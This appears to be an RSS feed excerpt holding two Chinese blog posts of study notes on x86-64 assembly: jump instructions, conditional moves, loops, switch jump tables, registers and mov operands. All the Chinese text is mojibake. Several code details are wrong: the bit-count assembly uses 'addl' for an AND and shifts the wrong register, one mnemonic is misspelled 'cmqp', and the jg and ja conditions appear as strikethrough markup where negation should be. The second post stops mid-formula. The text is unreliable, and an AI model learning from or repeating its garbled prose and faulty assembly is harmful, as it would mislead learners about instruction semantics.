	movzbl %al, %eax     # mov with zero byte to longword, å› ä¸ºè¿”å›intç±»å‹æ˜¯4å­—èŠ‚é•¿å­—,æ‰€ä»¥ä½¿ç”¨%eax
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;éœ€è¦è¯´æ˜ä¸€ç‚¹,x86-64ä¸­å½“ç»“æœæ˜¯32ä½æ—¶ä¼šæŠŠå‰©ä½™çš„32ä½è®¾ç½®ä¸º0.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;æ¡ä»¶åˆ†æ”¯&lt;/h1&gt;
&lt;h2&gt;è·³è½¬j*æŒ‡ä»¤&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;j*&lt;/th&gt;
&lt;th&gt;æ¡ä»¶&lt;/th&gt;
&lt;th&gt;å«ä¹‰&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;jmp&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;æ¡ä»¶ä¸ºçœŸæ—¶æ‰§è¡Œ&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;je&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;ZF&lt;/td&gt;
&lt;td&gt;equal/zero&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;jne&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;~ZF&lt;/td&gt;
&lt;td&gt;not equal/not zero&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;js&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;SF&lt;/td&gt;
&lt;td&gt;negative&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;jns&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;~SF&lt;/td&gt;
&lt;td&gt;nonnegative&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;jg&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;del&gt;(SF^OF)&amp;amp;&lt;/del&gt;ZF&lt;/td&gt;
&lt;td&gt;greater(signed)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;jge&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;~(SF^OF)&lt;/td&gt;
&lt;td&gt;greater or equal(signed)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;jl&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;(SF^OF)&lt;/td&gt;
&lt;td&gt;less(signed)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;jle&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;(SF^OF)&amp;amp;#124ZF&lt;/td&gt;
&lt;td&gt;less or equal(signed)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;ja&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;del&gt;CF&amp;amp;&lt;/del&gt;ZF&lt;/td&gt;
&lt;td&gt;above(unsigned)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;jb&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;CF&lt;/td&gt;
&lt;td&gt;below(unsigned)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2&gt;ä½¿ç”¨æ¡ä»¶åˆ†æ”¯çš„ä¾‹å­(æ—§å¼)&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* control.c */
long absdiff(long x,long y){
	long result;
	if(x&amp;gt;y)
		result = x-y;
	else
		result = y-x;
	return result;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç”Ÿæˆæ±‡ç¼–ä»£ç (ä¸ä½¿ç”¨æ¡ä»¶ç§»åŠ¨)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -Og -S -fno-if-conversion control.c
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;absdiff:
	cmpq    %rsi, %rdi    # x, y
	jle     .L4
	movq    %rdi, %rax
	subq    %rsi, %rax
	ret
.L4:                     # x &amp;lt;= y
	movq    %rsi, %rax
	subq    %rdi, %rax
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°,jumpè¯­å¥å°±åƒCè¯­è¨€ä¸­çš„gotoè¯­å¥&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;long absdiff_j (long x, long y) {
	long result; 
	int ntest = x &amp;lt;= y; 
	if (ntest) goto Else; 
	result = x-y; 
	goto Done; 
Else: 
	result = y-x; 
Done: 
	return result; }
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;ä½¿ç”¨æ¡ä»¶ç§»åŠ¨(ä¼˜åŒ–)&lt;/h2&gt;
&lt;p&gt;å°†if-then-elseé€»è¾‘ä¸­thenå’Œelseéƒ½å…ˆæ‰§è¡Œå¾—åˆ°ä¸¤ä¸ªç»“æœ,ç„¶åå†å†³å®šä½¿ç”¨å“ªä¸€ä¸ªç»“æœ
äº‹å®è¯æ˜åœ¨éå¸¸ç®€å•çš„è¿ç®—ä¸­è¿™æ ·æ›´æœ‰æ•ˆç‡!
åŸå› :åˆ†æ”¯ä¼šå¯¹ç®¡é“ä¸­çš„æŒ‡ä»¤æµé€ æˆæå¤§çš„å¹²æ‰°;æ¡ä»¶ç§»åŠ¨ä¸éœ€è¦æ§åˆ¶æƒè½¬ç§»&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* ä¸‰å…ƒè¿ç®—ç¬¦ */
	val = test ? then_expr : else_expr;
/* goto */
	result = then_expr;
	eval = else_expr;
	nt = !test;
	if(nt) result = eval;
	return result;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;gccä¼šåœ¨å®‰å…¨çš„å‰æä¸‹ä½¿ç”¨.
å¯¹åº”çš„æ±‡ç¼–ä»£ç &lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;absdiff:
	movq    %rdi, %rax    # x
	subq    %rsi, %rax    # result = x - y
	movq    %rsi, %rdx    # y
	subq    %rdi, %rdx    # eval = y - x
	cmqp    %rsi, %rdi    # æ¯”è¾ƒx, y
	cmovle  %rdx, %rax    # å¦‚æœx&amp;lt;=y,result = eval
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;ä¸å®œä½¿ç”¨æ¡ä»¶ç§»åŠ¨çš„æƒ…å†µ:&lt;ol&gt;
&lt;li&gt;ä¸¤ç§ç»“æœè®¡ç®—éš¾åº¦å¤§:åªæœ‰è®¡ç®—ç®€å•çš„æƒ…å†µä¸‹æ‰æœ‰æ˜æ˜¾æ•ˆæœ&lt;/li&gt;
&lt;li&gt;æœ‰ä¸è‰¯å‰¯ä½œç”¨:ä¾‹å¦‚ &lt;code&gt;val = p ? *p : 0;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;æ±¡æŸ“æ•°æ®ç”šè‡³å½±å“åˆ¤æ–­æœ¬èº«:ä¾‹å¦‚ &lt;code&gt;val = x&amp;gt;0 ? x*=y : x+=3;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;å¾ªç¯&lt;/h1&gt;
&lt;p&gt;åœ¨Cè¯­è¨€ä¸­,å¾ªç¯ç»“æ„çš„å®ç°è¯­å¥æœ‰whileè¯­å¥,forè¯­å¥,do-whileè¯­å¥,è¿˜å¯ä»¥ä½¿ç”¨gotoè¯­å¥æ¥è·³è½¬.è€Œä½¿ç”¨gotoæ›´æ¥è¿‘äºæ±‡ç¼–è¯­è¨€çš„å®ç°æ–¹å¼.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* ä½¿ç”¨goto */
long pcount_goto (unsigned long x) { 
	long result = 0; 
	loop: 
		result += x &amp;amp; 0x1; 
		x &amp;gt;&amp;gt;= 1; 
		if(x) goto loop; 
		return result; 
}// è®¡æ•°xä¸­1çš„ä¸ªæ•°
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯¹åº”çš„æ±‡ç¼–ä»£ç :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;	movl    $0, %eax    # result = 0;
.L2:
	movq    %rdi, %rdx
	addl    %$1, %edx   # t = x&amp;amp;0x1;
	addq    %rdx, %rax  # result += 1;
	shrq    $1, %rax    # x &amp;gt;&amp;gt;=1;
	jne     .L2         # if(x) goto loop;
	rep; ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°†whileè¯­å¥è½¬æ¢æˆgotoå¾ªç¯:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* whlie */
while(test)
	{BODY}


/* goto */
	goto TEST;
LOOP:
	{BODY}
TEST:
	if(test)
		goto loop;
DONE:
	...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°†do-whileè¯­å¥è½¬æ¢æˆgotoå¾ªç¯:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* do-whlie */
do
	{BODY}
while(test);

/* goto */
LOOP:
	{BODY}
TEST:
	if(test)
		goto LOOP;
DONE:
	...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å€¼å¾—ä¸€æçš„æ˜¯,gccä½¿ç”¨ä¸åŒçš„ä¼˜åŒ–çº§åˆ«ä¼šå¯¹whileè¯­å¥åšå‡ºä¸åŒçš„ç¿»è¯‘&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä½¿ç”¨-Og&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* whlie */
while(test)
	{BODY}


/* goto */
	goto TEST;
LOOP:
	{BODY}
TEST:
	if(test)
		goto loop;
DONE:
	...
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;ä½¿ç”¨-O1&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* whlie */
while(test)
	{BODY}

/* do-while */
if(!test)
	goto DONE;
do
	{BODY}
while(test);
DONE:
	...

/* goto */
if(!test)
	goto DONE;
LOOP:
	{BODY}
	if(test)
		goto loop;
DONE:
	...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»”ç»†çœ‹,-Ogå®Œå…¨é¡ºç€Cä»£ç çš„é€»è¾‘;è€Œ-O1ä¸ä½¿ç”¨TESTæ ‡å¿—,æ›´åŠ ç®€æ´.
å¯¹äºforå¾ªç¯,å¯ä»¥è½¬æ¢æˆwhileè¯­å¥&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* for */
for(Init;Test;Update)
	Body

/* while */
Init;
while(Test)
	Body
	Update
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦‚æœä½¿ç”¨-O1ä¼˜åŒ–,ç¼–è¯‘å™¨ä¼šç•¥å»Initåç¬¬ä¸€æ¬¡Test,å› ä¸ºé€šå¸¸æ˜¯æ»¡è¶³çš„.&lt;/p&gt;
&lt;h1&gt;switchè¯­å¥è·³è½¬&lt;/h1&gt;
&lt;p&gt;æˆ‘ä»¬çŸ¥é“,switchè¯­å¥æ¯”if-elseè¯­å¥åˆ¤æ–­æ›´å¿«.ç›¸åº”åœ°,å®ƒå¯¹åº”çš„æœºå™¨ä»£ç ä¸åŒ.
switchçš„æ¯ä¸€ç§caseåœ¨ç¼–è¯‘å™¨ç¼–è¯‘æ—¶å¿…é¡»æ˜¯å¸¸é‡.&lt;/p&gt;
&lt;h2&gt;è·³è½¬è¡¨(jump table)çš„ç»“æ„&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250119172324.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;æŠŠæ‰€æœ‰ä»£ç å—ç¼–è¯‘æˆä¸€å—æ€»ä»£ç ,å¹¶å°†å®ƒä»¬å­˜å‚¨åœ¨å†…å­˜,åŠ è½½å†…å­˜å°±èƒ½å¾—åˆ°è¿™äº›ä»£ç å—
è·³è½¬è¡¨å°±åƒä¸€ä¸ªæ•°ç»„,å¦‚æœçŸ¥é“ç´¢å¼•å°±èƒ½éšæœºå­˜å–,ä¸å¿…éå†å¯»æ‰¾.è¿™å°±æ˜¯switchè¯­å¥çš„æ±‡ç¼–ä»£ç çš„åŸºæœ¬æ€æƒ³.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä¸¾ä¾‹è¯´æ˜&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;long switch_eg(long x){
	long w = 1;
	switch(x){
		// case 0:
		case 1: ... break;
		case 2: ... /* Fall Through */
		case 3: ... break;
		// case 4:
		case 5:
		case 6: ... break;
		default: ...
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯¹åº”çš„æ±‡ç¼–ä»£ç :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;switch_eg:
	...
	cmpq    $6, %rdi
	ja      .L8             # è´Ÿæ•°å’Œå¤§äº6çš„æƒ…å†µå¯¹äºè§£ææˆunsignedç±»å‹æ¥è¯´éƒ½æ˜¯above,è¿™æ˜¯defaultæƒ…å†µ
	jmp     *.L4(,%rdi,8)   # goto *JTab[x]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å»ºç«‹è·³è½¬è¡¨:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;.section    .rodata
	.align 8
.L4:
	.quad    .L8  # x = 0
	.quad    .L3  # x = 1
	.quad    .L5  # x = 2
	.quad    .L9  # x = 3
	.quad    .L8  # x = 4
	.quad    .L7  # x = 5
	.quad    .L7  # x = 6
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;quadåªæ˜¯ä¸€ä¸ªå£°æ˜,è¡¨ç¤ºè¿™é‡Œéœ€è¦ä¸€ä¸ª8å­—èŠ‚çš„å€¼&lt;/p&gt;
&lt;p&gt;ç°åœ¨,åˆ†åˆ«æ¥çœ‹å„ä¸ªä»£ç å—&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;x == 1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;switch(x){
	case 1:
		w = y*z;
		break;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;.L3:
	movq    %rsi, %rax    # y
	imulq   %rdx, %rax   # y*z
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Fall Throughçš„æƒ…å†µ&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;switch(x){
	...
	case 2:
		w = y/z;
		/* Fall Through */
	case 3:
		w += z;
		break;
	...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ†å‰²ä¸º&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;case 2:
	w = y/z;
	goto merge;
case 3:
	w = 1;
merge:
	w += z;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250119180655.png&quot; alt=&quot;&quot;&gt;
å®é™…çš„æ±‡ç¼–ä»£ç :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;.L5:                    # case 2
	movq    %rsi, %rax
	cqto
	idivq   %rcx        # y/z
	jmp     .L6
.L9:                    # case 3
	movl    $1, %eax    # w = 1
.L6:
	addq    %rcx, %rax  # w += z
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è·³è½¬è¡¨æ˜¯ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„.
å¦‚æœcaseæœ‰è´Ÿæ•°,ä¼šè¿›è¡Œåç½®å¤„ç†,ä½¿å¾—æœ€å°å€¼æ˜¯0;
å¦‚æœcaseæƒ…å†µå°‘ä¸”æ•°å€¼ç›¸å·®å¤§(ç¨€ç–),å»ºç«‹è·³è½¬è¡¨æœ‰å¤§é‡å†—ä½™,å°±ä¼šè½¬æˆif-elseç»“æ„.
ä»ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºç¼–è¯‘å™¨ååˆ†èªæ˜!
éœ€è¦åœ¨ç¨‹åºæ‰§è¡Œä¹‹å‰å»ºç«‹å¥½å¹³è¡¡äºŒå‰æ ‘è·³è½¬è¡¨,è¿™å°±æ˜¯Cè¯­è¨€è¦æ±‚case æ˜¯å¸¸é‡çš„åŸå› !&lt;/p&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Fri, 17 Jan 2025 16:00:00 GMT</pubDate></item><item><title>æœºå™¨çº§ç¼–ç¨‹I(åŸºç¡€)</title><link>https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Bi%E5%9F%BA%E7%A1%80/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Bi%E5%9F%BA%E7%A1%80/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Bi%E5%9F%BA%E7%A1%80/&quot;&gt;https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Bi%E5%9F%BA%E7%A1%80/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;è‹±ç‰¹å°”/AMDå¤„ç†å™¨çš„å†å²å’Œæ¶æ„æ„&lt;/h1&gt;
&lt;h1&gt;Cè¯­è¨€,æ±‡ç¼–è¯­è¨€,æœºå™¨ä»£ç &lt;/h1&gt;
&lt;h2&gt;å®šä¹‰&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;æŒ‡ä»¤é›†æ¶æ„(ISA:instruction set architecture)
  å¤„ç†å™¨è®¾è®¡ç”¨äºç†è§£å’Œç¼–å†™æ±‡ç¼–/æœºå™¨ä»£ç çš„éƒ¨åˆ†&lt;/li&gt;
&lt;li&gt;å¾®æ¶æ„:æ¶æ„çš„å®ç°&lt;/li&gt;
&lt;li&gt;ä»£ç å½¢å¼:&lt;ul&gt;
&lt;li&gt;æœºå™¨ä»£ç :å¤„ç†å™¨æ‰§è¡Œçš„å­—èŠ‚çº§åˆ«çš„ç¨‹åº&lt;/li&gt;
&lt;li&gt;æ±‡ç¼–ä»£ç :ä»£è¡¨æœºå™¨ä»£ç çš„æ–‡æœ¬&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ISAæœ‰intel x86-64,ARMç­‰&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;æ±‡ç¼–/æœºå™¨ä»£ç æ¦‚è§ˆ&lt;/h2&gt;
&lt;p&gt;![](attachments/Pasted image%2020250117182544.png%20)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç¨‹åºè®¡æ•°å™¨(PC:Program counter):å­˜æ”¾ä¸‹ä¸€ä¸ªæŒ‡ä»¤çš„åœ°å€&lt;/li&gt;
&lt;li&gt;å¯„å­˜å™¨æ–‡ä»¶(Register):ç¨‹åºä¸­é‡å¤ä½¿ç”¨çš„æ•°æ®&lt;/li&gt;
&lt;li&gt;æ¡ä»¶ç (Condition code):å­˜å‚¨æŒ‡ä»¤çš„è¿è¡Œç»“æœ,é€»è¾‘è¿ç®—çš„ç»“æœ,ç”¨äºå®ç°æ¡ä»¶åˆ†æ”¯&lt;/li&gt;
&lt;li&gt;å†…å­˜:åœ°å€æ•°ç»„,å­˜æ”¾æ•°æ®å’Œä»£ç ,æ ˆæ”¯æŒè¿›ç¨‹&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Cè¯­è¨€ç¼–è¯‘åŸç†&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250117184342.png&quot; alt=&quot;&quot;&gt;
ç¼–è¯‘å…¶å®æ˜¯ä¸€ç³»åˆ—æ­¥éª¤,gccå…¶å®ä¹Ÿæ˜¯ä¸€ç³»åˆ—ç¨‹åº&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç¼–è¯‘æˆæ±‡ç¼–è¯­è¨€&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Cè¯­è¨€æºä»£ç :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* sum.c */
long plus(long x, long y);

void sumstore(long x, long y, long *dest){
	long t = plus(x, y);
	*dest = t;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½¿ç”¨å‘½ä»¤ç”Ÿæˆæ±‡ç¼–ä»£ç :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gcc -Og -S sum.c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯¹åº”äº§ç”Ÿçš„æ±‡ç¼–è¯­è¨€ä»£ç (ä¸»è¦éƒ¨åˆ†)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;sumstore: 
	pushq %rbx 
	movq %rdx, %rbx 
	call plus 
	movq %rax, (%rbx)
	popq %rbx
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;æ±‡ç¼–è¯­è¨€ä¸­,æ•´æ•°æ•°æ®å æœ‰1,2,4,8å­—èŠ‚
æµ®ç‚¹æ•°æ®å æœ‰4,8,æˆ–10å­—èŠ‚
æ³¨æ„æ•°ç»„,ç»“æ„ä½“è¿™äº›æ•°æ®ç±»å‹ä¸å­˜åœ¨äºæœºå™¨çº§åˆ«,æ˜¯ç”±ç¼–è¯‘å™¨äº§ç”Ÿçš„&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;åæ±‡ç¼–å™¨:ä»ç›®æ ‡ä»£ç è½¬å›åˆ°æ±‡ç¼–ä»£ç ,å˜é‡çš„åç§°ä¼šä¸¢å¤±
é¦–å…ˆ,åªéœ€è¦ç”±ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶,è¿™æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -Og sum.c -o sum
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥ä½¿ç”¨objdumpç¨‹åº&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;objdump -d sum
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ–è€…ä½¿ç”¨gdb&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gdb sum
(gdb) disassemble sumstore
Dump of assembler code funtion sumstore:
	0x0000000000400595 &amp;lt;+0&amp;gt;:    push %rbx
	0x0000000000400596 &amp;lt;+1&amp;gt;:    mov %rdx,%rbx
	0x0000000000400599 &amp;lt;+4&amp;gt;:    callq 0x400590 &amp;lt;plus&amp;gt;
	0x000000000040059e &amp;lt;+9&amp;gt;:    mov %rax,(%rbx)
	0x00000000004005a1 &amp;lt;+12&amp;gt;:    pop %rbx      
	0x00000000004005a2 &amp;lt;+13&amp;gt;:    retq         
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;p&gt;è¿è¡Œæ±‡ç¼–ç¨‹åº
æŠŠæ–‡æœ¬è¡¨ç¤ºçš„æŒ‡ä»¤å˜æˆå®é™…çš„å­—èŠ‚æŒ‡ä»¤&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;é“¾æ¥å™¨
å°†ä¸åŒçš„æ–‡ä»¶èåˆåœ¨ä¸€èµ·,åŒ…æ‹¬æˆ‘ç¼–å†™çš„ç¨‹åºå’Œåº“æ–‡ä»¶
å½“è¿è¡Œç¨‹åºæ—¶,å¯èƒ½è¿˜æœ‰ä¸€äº›åº“åœ¨ç¨‹åºé¦–æ¬¡å¼€å§‹æ—¶åŠ¨æ€å¯¼å…¥&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;æ±‡ç¼–åŸºç¡€:å¯„å­˜å™¨,æ“ä½œæ•°,moveæŒ‡ä»¤&lt;/h1&gt;
&lt;h2&gt;x86-64çš„æ•´æ•°å¯„å­˜å™¨&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250118182908.png&quot; alt=&quot;&quot;&gt;
æœ‰16ä¸ªå¯„å­˜å™¨å¯ä»¥ç”¨æ¥ä¿å­˜æ•´æ•°å’ŒæŒ‡é’ˆ,å…¶ä¸­ä¸€äº›ä»¥å­—æ¯ä¸ºå,ä¸€äº›ä»¥æ•°å­—ä¸ºå
ä½¿ç”¨%rçš„æ˜¯64ä½,ä½¿ç”¨%eçš„æ˜¯32ä½,%eç‰ˆæœ¬åªæ˜¯%rå®ä½“çš„ä½32ä½.&lt;/p&gt;
&lt;p&gt;IA32çš„8ä¸ªå¯„å­˜å™¨å°±æ˜¯ä¸Šé¢çš„æ‰€æœ‰%e
æ—§æœºå™¨å¯ä»¥ä½¿ç”¨è¿™äº›å¯„å­˜å™¨çš„ä½16ä½(2å­—èŠ‚)å’Œä½8ä½(1å­—èŠ‚),å·²ç»æ˜¯&amp;quot;å†å²é—äº§&amp;quot;äº†.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250118184424.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;movæŒ‡ä»¤&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;movq src, dst&lt;/code&gt; : å¤åˆ¶srcåˆ°dest&lt;/p&gt;
&lt;h2&gt;æ“ä½œæ•°çš„ç±»å‹&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ç«‹å³æ•°:å¸¸æ•´æ•°&lt;ul&gt;
&lt;li&gt;ç±»ä¼¼äºCè¯­è¨€çš„å¸¸é‡,ä½†æ˜¯å¸¦æœ‰&amp;#39;$&amp;#39;,ä¾‹å¦‚ &lt;code&gt;$0x400&lt;/code&gt;,&lt;code&gt; $-533&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ç¼–ç ä¸º1,2æˆ–4å­—èŠ‚&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;å¯„å­˜å™¨:16ä¸ªæ•´æ•°å¯„å­˜å™¨ä¹‹ä¸€&lt;ul&gt;
&lt;li&gt;ä¾‹å¦‚&lt;code&gt;%rax&lt;/code&gt;,&lt;code&gt;%r13&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%rsp&lt;/code&gt;æ˜¯ä¿ç•™ä¸ºç‰¹æ®Šç”¨é€”&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;å†…å­˜:å¯„å­˜å™¨ä¿å­˜çš„åœ°å€å¯¹åº”çš„å†…å­˜&lt;ul&gt;
&lt;li&gt;åœ¨å¯„å­˜å™¨çš„åç§°å¤–åŠ ä¸Šæ‹¬å·,ä¾‹å¦‚:&lt;code&gt;(%rax)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;movå’Œæ“ä½œæ•°çš„åˆå¹¶ä½¿ç”¨&lt;/h2&gt;
&lt;p&gt;$$
\text{movq}
\left { \begin{matrix} 
\text{Imm} \left { \begin{matrix} \text{Reg} &amp;amp;&amp;amp; \text{movq ;$0x4,%rax} &amp;amp;&amp;amp; \text{æŠŠ%raxçš„å€¼è®¾ç½®ä¸º0x4}\ \text{Mem} &amp;amp;&amp;amp; \text{movq;$-147,(%rax)} &amp;amp;&amp;amp; \text{æŠŠ%raxæŒ‡å‘çš„å†…å­˜è®¾ç½®ä¸º-147} \end{matrix}\right. \ 
